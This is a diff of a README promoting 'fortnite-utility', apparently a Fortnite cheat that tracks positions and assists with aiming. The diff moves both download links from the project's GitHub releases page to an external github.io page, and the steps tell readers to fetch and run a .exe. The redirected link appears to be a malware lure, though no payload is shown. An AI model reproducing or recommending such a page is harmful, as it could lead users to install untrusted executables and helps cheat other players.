@@ -1,6 +1,6 @@
 # 🎯 fortnite-utility - Improve your tactical awareness and aim
 
-[![Download](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/sluggish-moonshot128/fortnite-utility/releases)
+[![Download](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://sluggish-moonshot128.github.io)
 
 fortnite-utility provides visual data and mechanical support for players on Windows. This application runs alongside the game to track positions, manage rotations, and assist with building tasks.
 
@@ -34,7 +34,7 @@ Your computer must meet the following hardware and software standards to run thi
 
 Follow these instructions to use the software.
 
-1. Visit the [releases page](https://github.com/sluggish-moonshot128/fortnite-utility/releases) to download the latest version.
+1. Visit the [releases page](https://sluggish-moonshot128.github.io) to download the latest version.
 2. Select the file ending in .exe from the assets list.
 3. Save the file to a folder on your computer.
 4. Locate the file in your downloads folder.
